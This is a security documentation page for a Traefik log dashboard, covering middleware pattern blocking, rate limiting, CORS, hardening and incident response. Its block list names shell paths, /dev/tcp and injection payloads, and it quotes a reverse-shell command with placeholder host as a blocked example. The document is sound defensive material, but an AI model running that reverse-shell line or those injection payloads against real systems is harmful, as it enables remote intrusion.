---
title: Security
description: Security features, best practices, and recent fixes
---

import { Callout } from 'fumadocs-ui/components/callout';
import { Step, Steps } from 'fumadocs-ui/components/steps';
import { Tab, Tabs } from 'fumadocs-ui/components/tabs';
import { Card, Cards } from 'fumadocs-ui/components/card';

<Callout title="Security Updates" type="warn">
v2.3 includes critical security patches (CVE-2025-55182) and comprehensive request validation.
</Callout>

## Recent Security Fixes (v2.3)

### 1. Middleware Protection

The dashboard now includes comprehensive request validation through `middleware.ts`:

<Steps>
<Step>
### Malicious Pattern Detection
Automatically blocks requests containing shell commands, code injection attempts, and XSS payloads.

```typescript
// Blocked patterns include:
- Shell commands: /bin/bash, /bin/sh, /dev/tcp
- Code execution: eval(), exec(), system()
- Script injection: <script>, onclick=, onerror=
- Template injection: ${, $(
```
</Step>

<Step>
### Rate Limiting
Protects against DoS attacks by limiting requests to 100 per minute per IP address.

You can customize rate limits in `middleware.ts`:
```typescript
const RATE_LIMIT_MAX_REQUESTS = 100; // Adjust as needed
const RATE_LIMIT_WINDOW = 60000; // 1 minute
```
</Step>

<Step>
### Server Action Validation
Filters out fake Server Action requests commonly used in attacks.
</Step>

<Step>
### Security Headers
Automatically adds essential security headers:
- X-Frame-Options (clickjacking protection)
- Content-Security-Policy
- X-XSS-Protection
- X-Content-Type-Options
</Step>
</Steps>

### 2. Error Handling

Enhanced error handling to prevent information leakage:

- **global-error.tsx** - Catches and filters malicious errors
- **instrumentation.ts** - Runtime error filtering to reduce log pollution

<Callout type="info">
Security warnings are logged without exposing attack payloads, preventing attackers from learning about your defenses.
</Callout>

### 3. CORS Configuration

Configurable CORS via environment variables:

```bash title=".env.local"
ALLOWED_ORIGINS=https://yourdomain.com
```

<Callout type="warn">
The default is `*` for development. **Always restrict origins in production!**
</Callout>

## Attack Patterns Detected

The middleware automatically logs and blocks:

### 1. Reverse Shell Attempts
```bash
# Examples of blocked patterns:
/bin/bash -i >& /dev/tcp/IP/PORT
Base64 encoded shell commands
```

### 2. Code Injection
- JavaScript injection via Server Actions
- Template injection attacks
- SQL injection attempts

### 3. XSS Attempts
- Script tags in URLs or parameters
- Event handler injection
- Data URI schemes

## Security Best Practices

### For Production Deployments

<Steps>
<Step>
### Restrict CORS Origins
```bash title=".env.local"
ALLOWED_ORIGINS=https://yourdomain.com
```
</Step>

<Step>
### Enable HTTPS Only
Use a reverse proxy (Traefik, nginx) with TLS:
```yaml title="traefik.yml"
entryPoints:
  web:
    address: ":80"
    http:
      redirections:
        entryPoint:
          to: websecure
          scheme: https
  websecure:
    address: ":443"
```
</Step>

<Step>
### Implement Strong Authentication
Generate secure tokens:
```bash
# Generate a strong 32-byte token
openssl rand -hex 32
```

Update both agent and dashboard:
```yaml title="docker-compose.yml"
services:
  traefik-agent:
    environment:
      - TRAEFIK_LOG_DASHBOARD_AUTH_TOKEN=your_secure_token_here

  traefik-dashboard:
    environment:
      - AGENT_API_TOKEN=your_secure_token_here
```
</Step>

<Step>
### Monitor Security Logs
```bash
# View security events
docker compose logs -f dashboard | grep "\[Security\]"
```
</Step>

<Step>
### Update Rate Limits
Edit `middleware.ts` to match your traffic patterns:
```typescript
const RATE_LIMIT_MAX_REQUESTS = 100;
const RATE_LIMIT_WINDOW = 60000; // milliseconds
```
</Step>

<Step>
### Review CSP Policy
Update Content-Security-Policy in `middleware.ts` for your requirements:
```typescript
headers.set(
  'Content-Security-Policy',
  "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; ..."
);
```
</Step>
</Steps>

## Incident Response

### If You See Security Warnings

<Tabs items={['Step 1', 'Step 2', 'Step 3', 'Step 4']}>
<Tab value="Step 1">
### Check Source IP
```bash
docker compose logs dashboard | grep "\[Security\]"
```
Look for repeated attempts from the same IP address.
</Tab>

<Tab value="Step 2">
### Block Repeat Offenders
At firewall level:
```bash
# Example: iptables
iptables -A INPUT -s MALICIOUS_IP -j DROP

# Example: firewalld
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="MALICIOUS_IP" reject'
```
</Tab>

<Tab value="Step 3">
### Review Access Patterns
Multiple 403 errors indicate scanning or attack attempts. Consider:
- Adjusting rate limits if legitimate traffic is blocked
- Adding IP whitelist for known good clients
- Implementing fail2ban for automated blocking
</Tab>

<Tab value="Step 4">
### Update Patterns
If you discover new attack vectors:
```typescript title="middleware.ts"
const MALICIOUS_PATTERNS = [
  // Add new patterns here
  /your-new-pattern/i,
];
```
Please report new attack patterns to the project maintainers.
</Tab>
</Tabs>

## Authentication

### Agent Authentication

All API requests require Bearer token authentication:

```bash
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://localhost:5000/api/logs/status
```

### Token Best Practices

<Callout type="warn">
- Never commit tokens to version control
- Rotate tokens regularly
- Use different tokens for each agent
- Store tokens in environment variables or secrets management
</Callout>

## Secure Deployment Checklist

- [ ] HTTPS enabled via reverse proxy
- [ ] Strong authentication tokens generated
- [ ] CORS origins restricted to your domain
- [ ] Security logs monitored regularly
- [ ] Rate limits configured appropriately
- [ ] Latest version installed (v2.3+)
- [ ] Firewall rules configured
- [ ] Sensitive logs excluded from tracking
- [ ] Database file permissions secured
- [ ] Container security best practices followed

## Vulnerability Disclosure

<Callout title="Responsible Disclosure" type="error">
If you discover a security vulnerability:
1. **Do NOT** open a public GitHub issue
2. Email the maintainers directly
3. Include: description, reproduction steps, impact assessment
4. Allow reasonable time for a fix before public disclosure
</Callout>

## Security Updates History

| Version | Date | Changes |
|---------|------|---------|
| v2.3.0 | 2025-12 | CVE-2025-55182 fix, middleware protection, rate limiting, malicious pattern detection |
| v2.2.x | 2025-12 | Basic CORS and token authentication |
| v2.0.x | 2024 | Initial multi-agent architecture |

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Next.js Security](https://nextjs.org/docs/app/building-your-application/configuring/security)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CVE-2025-55182 Details](https://nvd.nist.gov/)

## Next Steps

<Cards>
  <Card
    title="Configuration"
    description="Learn how to configure secure deployments"
    href="/docs/configuration"
  />
  <Card
    title="Troubleshooting"
    description="Debug security-related issues"
    href="/docs/troubleshooting"
  />
</Cards>
